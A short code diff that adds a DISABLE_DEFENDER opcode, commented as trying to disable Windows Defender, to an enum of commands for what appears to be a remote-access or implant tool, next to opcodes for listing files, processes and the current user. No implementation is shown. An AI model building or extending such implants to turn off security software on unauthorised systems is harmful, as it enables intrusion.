@@ -17,6 +17,7 @@ class Opcodes(Enum):
     LS = 0x0C  # List files in a directory
     PS = 0x0D  # List running processes
     WHOAMI = 0x0E  # Get the current user
+    DISABLE_DEFENDER = 0x0F  # Try to disable windows defender
 
     def __str__(self):
         return self.name
